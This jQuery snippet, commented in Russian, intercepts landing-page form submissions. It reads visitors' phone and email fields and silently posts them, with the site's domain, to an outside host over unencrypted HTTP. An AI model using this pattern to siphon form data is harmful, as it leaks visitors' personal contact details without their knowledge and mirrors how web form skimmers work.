// Перехват телефона и почты в формах:
$(function() {

  //Поиск активной формы
  $( "input" ).focus(function() {

    //ID активной формы
    var id = $( this ).closest('.block, .widget.popup.overlay, .lp_popup').attr('id');

    if (id.indexOf('overlay-block-') != -1) { //Если форма popup
      id = id.substr(14); //Оставляем только ID

      var submit = $( '#overlay-block-'+id+' input[type=submit]' );

      //По клику на отправку из popup формы
      $( submit ).unbind('mousedown').mousedown(function() { //unbind - от задвоенной отправки
        //Берем телефон из формы
        phone =  $('#overlay-block-'+id).find("input[rel=phone]").val();
        //Берем почту из формы
        email =  $('#overlay-block-'+id).find("input[rel=email]").val();

        //На отправку
        send(phone, email);
      });

    } else {

      id = id.substr(6); //Оставляем только ID

      var submit = 'a[href="#fire_form_'+id+'"]';
      
      //По клику на отправку из обычной формы
      $( submit ).unbind('mousedown').mousedown(function() { //unbind - от задвоенной отправки

        //Берем телефон из формы
        phone =  $("#block-"+id+" input[type=tel], #popup_"+id+" input[placeholder=Телефон]").val();
        //Берем почту из формы
        email =  $("#block-" + id).find("input[type=email]").val();

        //На отправку
        send(phone, email);
      }); 
    }
    // console.log(submit);

    function send(phone, email) {

      this.phone = phone;
      this.email = email;
      this.domain = document.domain;

      if ( this.phone ) {

        //Оставляем только цифры
        this.phone = this.phone.replace(/\D/g,'');

        //Если телефон равен 10 знакам
        if ( this.phone.length === 10 || this.phone.length === 11 ) {
          //Отправляем данные
          sendData();
        }

      } else if ( this.email ) {
        //Отправляем данные
        sendData();
      }

      function sendData() {
        console.log(this.domain);
        console.log(this.email);
        console.log(this.phone);

        $.post( "http://www.externalsite.ru/lpgenerator/", { domain: this.domain, phone: this.phone, email: this.email } );
      }

    }

    $( this ).keypress(function(e) {
      if(e.which == 13) { //При нажатии на кнопку "Enter"
         $( submit ).mousedown();
      }
    });
    
  });

});